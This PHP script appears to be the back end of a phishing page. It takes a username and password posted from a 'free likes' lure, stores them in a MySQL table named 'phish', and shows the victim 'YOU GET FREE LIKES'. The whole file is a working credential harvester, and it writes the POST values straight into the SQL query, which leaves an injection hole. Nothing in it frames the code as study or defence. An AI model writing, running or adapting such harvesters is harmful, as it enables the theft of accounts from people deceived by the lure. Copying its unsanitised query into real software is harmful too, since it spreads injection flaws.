<?php
$connection = mysqli_connect( "localhost",  "root", "", "phish");
if($connection){
    echo "succesfully connected<br>";

}else{
   echo "fail";
}
$name = $_POST['name'];
$pass = $_POST['pass'];

$sql = "INSERT INTO phish(username, password) VALUES('$name', '$pass')";
if(mysqli_query($connection, $sql)){
    echo "YOU GET FREE LIKES";
}else{
    echo "eror";
}
mysqli_close($connection);

?>